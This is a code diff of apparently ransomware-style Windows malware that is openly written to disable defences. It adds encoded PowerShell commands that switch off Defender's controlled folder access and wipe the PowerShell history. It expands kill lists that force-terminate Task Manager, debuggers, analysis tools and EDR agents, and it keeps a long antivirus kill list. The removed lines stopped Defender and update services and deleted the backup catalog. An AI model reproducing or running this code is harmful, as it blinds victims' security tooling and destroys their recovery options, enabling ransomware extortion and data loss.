@@ -320,16 +320,23 @@ def block_processes():
     execute_command("powershell -ExecutionPolicy Bypass -EncodedCommand UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQBuAGEAYgBsAGUAQwBvAG4AdAByAG8AbABsAGUAZABGAG8AbABkAGUAcgBBAGMAYwBlAHMAcwAgAEQAaQBzAGEAYgBsAGUAZAA=")
     execute_command("powershell -ExecutionPolicy Bypass -EncodedCommand UgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAIgAkAGUAbgB2ADoAVQBTAEUAUgBQAFIATwBGAEkATABFAFwAQQBwAHAARABhAHQAYQBcAFIAbwBhAG0AaQBuAGcAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUABTAFIAZQBhAGQATABpAG4AZQBcAEMAbwBuAHMAbwBsAGUASABvAHMAdABfAGgAaQBzAHQAbwByAHkALgB0AHgAdAAiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlAA==")
     blocked_processes = [
-        "cmd",
-        "powershell",
-        "regedit",
-        "Processhacker",
-        "sdclt",
-        "SecurityHealthSystray",
-        
+        "cmd", "powershell", "regedit", "taskmgr", "explorer",
+        "netstat", "msconfig", "perfmon", "tasklist", "services",
+        "sysmon", "eventvwr", "wmic", "schtasks", "SecurityHealthSystray",
+        "MpCmdRun", "MsMpEng", "smartscreen",
+        "ProcessHacker", "procexp", "procexp64", "tcpview", "wireshark",
+        "autoruns", "autorunsc", "filemon", "regmon", "sandboxie", "ollydbg",
+        "x32dbg", "x64dbg", "ida64", "ida", "windbg", "Dbgview", "frida",
+        "hookexplorer", "gmer", "cain", "fiddler", "procmon", "regripper",
+        "netmon", "WMIADAP",
+        "SbieCtrl", "SbieSvc", "mbam", "mbamtray", "mbae", "mbaeservice",
+        "cyserver", "cytray", "cb", "carbonblack", "SentinelAgent",
+        "SentinelUI", "SentinelHelperService", "esensor", "csfalconcontainer",
+        "csfalconservice", "csfalcon", "sxutil"
     ]
+    
     for proc in blocked_processes:
-        execute_command(f"taskkill /f /im {proc}.exe")
+        execute_command(f"taskkill /f /im \"{proc}.exe\"")
 
 
 def encrypt_key(aes_key):
@@ -506,22 +513,6 @@ def execute_command(command, shell=True, wait=True):
 
 
 def disable_AV():
-    execute_command("net stop WinDefend")
-    execute_command("sc config WinDefend start = disabled")
-    execute_command("net stop wuauserv")
-    execute_command("sc config wuauserv start = disabled")
-    execute_command("net stop bits")
-    execute_command("sc config bits start = disabled")
-    execute_command("net stop wscsvc")
-    execute_command("sc config wscsvc start = disabled")
-    execute_command("wbadmin delete catalog -quiet")
-    execute_command("taskkill /f /im MsMpEng.exe")
-    execute_command("taskkill /f /im Sophos*")
-    execute_command("taskkill /f /im McAfee*")
-    execute_command("net stop SysmonLog")
-    execute_command("net stop SysmonDrv")
-    execute_command("net stop AVP*")
-    execute_command("net stop SEP*")
     AV_processes = [
         "a2adguard", "a2adwizard", "a2antidialer", "a2cfg", "a2cmd", "a2free", "a2guard", "a2hijackfree", "a2scan", "a2service", "a2start", "a2sys", "a2upd", "aavgapi", "aawservice", "aawtray", "ad-aware", "ad-watch", "alescan", "anvir", "ashdisp", "ashmaisv",
         "ashserv", "ashwebsv", "aswupdsv", "atrack", "avgagent", "avgamsvr", "avgcc", "avgctrl", "avgemc", "avgnt", "avgtcpsv", "avguard", "avgupsvc", "avgw", "avkbar", "avk", "avkpop", "avkproxy", "avkservice", "avktray", "avktray", "avkwctl", "avkwctl",
@@ -533,10 +524,11 @@ def disable_AV():
         "pccpfw", "pccwin98", "persfw", "protector", "qconsole", "qdcsfs", "rtvscan", "sadblock", "safe", "sandboxieserver", "savscan", "sbiectrl", "sbiesvc", "sbserv", "scfservice", "sched", "schedm", "scheduler daemon", "sdhelp", "serv95", "sgbhp", "sgmain", "slee503",
         "smartfix", "smc", "snoopfreesvc", "snoopfreeui", "spbbcsvc", "sp_rsser", "spyblocker", "spybotsd", "spysweeper", "spysweeperui", "spywareguard.dll", "spywareterminatorshield", "ssu", "steganos5", "stinger", "swdoctor", "swupdate", "symlcsvc", "symundo", "symwsc", "symwscno", "tcguard", "tds2-98",
         "tds-3", "teatimer", "tgbbob", "tgbstarter", "tsatudt", "umxagent", "umxcfg", "umxfwhlp", "umxlu", "umxpol", "umxtray", "usrprmpt", "vetmsg9x", "vetmsg", "vptray", "vsaccess", "vsserv", "wcantispy", "win-bugsfix", "winpatrol", "wrsssdk", "xcommsvr", "xfr",
-        "xp-antispy", "zegarynka", "zlclient", "winpa'rolex", "cmd", "powershell", "regedit", "Processhacker", "sdclt", "SecurityHealthSystray",
+        "xp-antispy", "zegarynka", "zlclient", "winpa'rolex",
     ]
+    
     for proc in AV_processes:
-        execute_command(f"taskkill /f /im {proc}.exe")
+        execute_command(f"taskkill /f /im \"{proc}.exe\"")
 
 
 def disable_all():
